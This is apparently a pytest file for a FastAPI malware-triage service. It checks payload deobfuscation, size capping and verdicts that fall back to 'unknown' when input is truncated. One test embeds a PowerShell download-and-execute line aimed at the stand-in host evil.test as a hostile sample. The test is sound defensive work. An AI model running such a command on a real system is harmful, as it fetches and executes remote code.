import json
from fastapi.testclient import TestClient
from grounding_service.app import create_app
from grounding_service.config import Settings


def _client(seeded_retriever, tmp_path, factory=None):
    s = Settings(runs_path=str(tmp_path / "runs.jsonl"))
    return TestClient(create_app(seeded_retriever, s, deobf_client_factory=factory))


def test_deobfuscate_builtin_no_client(seeded_retriever, tmp_path):
    c = _client(seeded_retriever, tmp_path, factory=None)
    r = c.post("/deobfuscate", json={"payload": "powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAA=="})
    body = r.json()
    assert r.status_code == 200
    assert body["final_plaintext"] == "Write-Host "
    assert body["verdict_inputs"]["fully_resolved"] is True


def test_deobfuscate_survives_client_outage(seeded_retriever, tmp_path):
    def boom():
        raise RuntimeError("no key")
    c = _client(seeded_retriever, tmp_path, factory=boom)
    r = c.post("/deobfuscate", json={"payload": "powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAA=="})
    assert r.status_code == 200 and r.json()["final_plaintext"] == "Write-Host "


def test_deobfuscate_caps_payload(seeded_retriever, tmp_path):
    # F4/D2/D6: /deobfuscate must cap the attacker payload before feeding the
    # engine, and max_bytes must NOT be usable to raise the cap above the config
    # ceiling (65536). The CRITICAL D4 interaction: capping must not silently
    # false-clean a payload whose malice sits PAST the cap -- truncation floors
    # the verdict to unknown.
    c = _client(seeded_retriever, tmp_path, factory=None)
    prefix = "hello world " * 6000          # 72,000 chars, benign + unencoded
    tail = " IEX(New-Object Net.WebClient).DownloadString('http://evil.test/x')"
    payload = prefix + tail                  # malicious tail sits well past the 65536 cap
    # max_bytes way over the ceiling: attacker must not be able to raise the cap
    r = c.post("/deobfuscate", json={"payload": payload, "max_bytes": 10_000_000})
    assert r.status_code == 200
    body = r.json()
    # processed length respects the config ceiling, not the attacker's max_bytes
    assert len(body["final_plaintext"]) <= 65536
    assert len(body["final_plaintext"]) < len(payload)
    # the malicious tail was chopped, so nothing from past the cap leaked
    assert body["iocs"] == []
    assert body["verdict_inputs"]["behavioral_hits"] == []
    # ...but truncation is signalled so the verdict floors to unknown (no false clean)
    assert "truncated" in body["flags"]
    vi = body["verdict_inputs"]
    v = c.post("/triage-verdict", json={
        "behavioral_hits": vi["behavioral_hits"],
        "ioc_verdicts": {},
        "fully_resolved": vi["fully_resolved"],
        "flags": vi["flags"],
    }).json()
    assert v["verdict"] == "unknown"          # NOT "clean"


def test_triage_verdict_is_pure(seeded_retriever, tmp_path):
    c = _client(seeded_retriever, tmp_path)
    r = c.post("/triage-verdict", json={
        "behavioral_hits": [{"rule_id": "exec.iex", "category": "exec", "evidence": "IEX"}],
        "ioc_verdicts": {"http://x": "malicious"},
        "fully_resolved": True, "flags": []})
    assert r.json()["verdict"] == "malicious"
